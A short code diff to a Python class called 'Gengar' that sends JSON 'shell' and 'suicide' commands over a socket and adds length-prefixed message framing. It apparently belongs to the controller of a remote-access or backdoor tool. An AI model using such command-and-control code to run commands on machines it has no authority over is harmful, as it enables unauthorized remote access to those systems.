@@ -6,15 +6,17 @@ class Gengar:
         self._sock = sock
 
     def _send(self, data):
+        self._sock.send(str(len(data)).encode())
         self._sock.send(data.encode())
 
-    def _recv(self, buff_size):
-        return self._sock.recv(buff_size).decode().strip()
+    def _recv(self):
+        buff_len = int(self._sock.recv(128).decode())
+        return self._sock.recv(buff_len).decode().strip()
 
     def shell(self, cmd):
         payload = json.dumps(dict(cmd='shell', content=cmd))
         self._send(payload)
-        return self._recv(4096)
+        return self._recv()
 
     def suicide(self):
         payload = json.dumps(dict(cmd='suicide'))
